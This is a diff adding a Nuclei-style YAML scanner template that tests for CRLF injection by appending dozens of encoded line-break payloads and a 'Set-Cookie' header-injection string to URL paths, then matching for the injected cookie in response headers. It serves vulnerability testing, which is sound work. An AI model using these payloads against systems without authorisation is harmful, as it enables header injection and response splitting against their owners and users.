@@ -1,0 +1,79 @@
+id: crlf-path
+
+info:
+  name: CRLF Injection
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: fuzzing-req,fuzzing-req-crlf,fuzzing-req-path,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+      
+    payloads:
+      escape:
+        - "%00"
+        - "%09%0A"
+        - "%09%0D"
+        - "%09%0D%0A"
+        - "%0a"
+        - "%0a%20"
+        - "%0d"
+        - "%0d%09"
+        - "%0d%0a"
+        - "%0d%0a%09"
+        - "%0d%0a%20"
+        - "%0d%20"
+        - "%20"
+        - "%20%0a"
+        - "%20%0d"
+        - "%20%0d%0a"
+        - "%23%0a"
+        - "%23%0a%20"
+        - "%23%0d"
+        - "%23%0d%0a"
+        - "%23%oa"
+        - "%25%30"
+        - "%25%30%61"
+        - "%2e%2e%2f%0d%0a"
+        - "%2f%2e%2e%0d%0a"
+        - "%2f..%0d%0a"
+        - "%3f"
+        - "%3f%0a"
+        - "%3f%0d"
+        - "%3f%0d%0a"
+        - "%C0%8D%C0%8A"
+        - "%C4%8A"
+        - "%C4%8D%C4%8A"
+        - "%EA%A8%8A"
+        - "%EA%A8%8D"
+        - "%EA%A8%8D%EA%A8%8A"
+        - "%e5%98%8a%e5%98%8d"
+        - "%e5%98%8a%e5%98%8d%0a"
+        - "%e5%98%8a%e5%98%8d%0d"
+        - "%e5%98%8a%e5%98%8d%0d%0a"
+        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+        - "%u0000"
+        - "%u000a"
+        - "%u000d"
+        - "%u000d%u000a"
+        
+    fuzzing:
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
